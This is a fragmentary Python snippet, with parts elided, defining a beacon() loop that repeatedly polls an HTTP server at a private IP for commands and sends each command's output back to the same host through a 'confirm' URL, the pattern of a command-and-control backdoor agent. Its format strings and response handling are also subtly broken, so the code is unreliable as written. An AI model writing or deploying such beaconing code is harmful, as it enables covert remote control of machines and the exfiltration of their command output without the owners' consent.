...
def beacon():
	...
	while True:
		...
		commands = requests.get('http://192.168.7.222/beacon?ip={}'.format(sys.argv[1], ip))
		...
		if commands != '[]':
			for cmd in commands:
				...
				requests.get('http://192.168.7.222/confirm?ip={}&cmd={}&output={}'.format(sys.argv[1], ip, cmd, cmds[cmd])) 
			#print commands
			#print(cmds)
